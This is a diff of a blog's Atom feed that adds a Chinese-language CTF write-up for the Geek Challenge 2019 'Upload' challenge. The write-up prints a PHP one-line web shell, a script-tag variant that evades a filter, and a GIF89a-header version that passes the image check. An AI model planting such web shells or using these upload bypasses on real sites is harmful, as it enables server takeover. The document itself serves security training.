@@ -6,7 +6,7 @@
   <link href="http://vinsonx.net/atom.xml" rel="self"/>
   
   <link href="http://vinsonx.net/"/>
-  <updated>2022-03-26T07:04:15.981Z</updated>
+  <updated>2022-03-27T09:11:08.705Z</updated>
   <id>http://vinsonx.net/</id>
   
   <author>
@@ -15,6 +15,25 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>极客大挑战2019（Upload）</title>
+    <link href="http://vinsonx.net/2022/03/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%EF%BC%88Upload%EF%BC%89/"/>
+    <id>http://vinsonx.net/2022/03/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%EF%BC%88Upload%EF%BC%89/</id>
+    <published>2022-03-27T08:41:17.000Z</published>
+    <updated>2022-03-27T09:11:08.705Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="入门CTF题目-Upload"><a href="#入门CTF题目-Upload" class="headerlink" title="入门CTF题目(Upload) "></a>入门CTF题目(Upload) <span id="more"></span></h3><p><strong>打开题目发现是图片上传</strong><br><img src="/2022/03/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%EF%BC%88Upload%EF%BC%89/%E9%A2%98%E7%9B%AE.png" alt="题目"><br><strong>上传一句话木马利用bp修改后缀名php、phtml等</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>提示里面里面的字符被过滤了</strong><br><img src="/2022/03/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%EF%BC%88Upload%EF%BC%89/%E8%BF%87%E6%BB%A41.png" alt="过滤1"><br><strong>使用js脚本绕过</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>提示需要使用图片</strong><br><img src="/2022/03/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%EF%BC%88Upload%EF%BC%89/%E8%BF%87%E6%BB%A41.png" alt="过滤2"><br><strong>使用文件头绕过</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/03/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%EF%BC%88Upload%EF%BC%89/bp.png" alt="bp"><br><strong>网页进行了跳转</strong><br><img src="/2022/03/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%EF%BC%88Upload%EF%BC%89/%E8%B7%B3%E8%BD%AC.png" alt="跳转"><br><strong>网址为</strong></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://26df0d15-d9dc-<span class="number">47b9</span>-834a-d5ee0a491a1f.node4.buuoj.cn:<span class="number">81</span>/upload_file.php</span><br></pre></td></tr></table></figure><p><strong>看到后面有个upload 猜测在这个路径下面</strong></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://26df0d15-d9dc-<span class="number">47b9</span>-834a-d5ee0a491a1f.node4.buuoj.cn:<span class="number">81</span>/upload/<span class="built_in">demo</span>.phtml</span><br></pre></td></tr></table></figure><p><strong>利用hackbar工具找到flag</strong><br><img src="/2022/03/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%EF%BC%88Upload%EF%BC%89/flag.png" alt="flag"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h3 id=&quot;入门CTF题目-Upload&quot;&gt;&lt;a href=&quot;#入门CTF题目-Upload&quot; class=&quot;headerlink&quot; title=&quot;入门CTF题目(Upload) &quot;&gt;&lt;/a&gt;入门CTF题目(Upload)&lt;/h3&gt;</summary>
+    
+    
+    
+    <category term="CTF" scheme="http://vinsonx.net/categories/CTF/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>ACTF2020新生赛Upload</title>
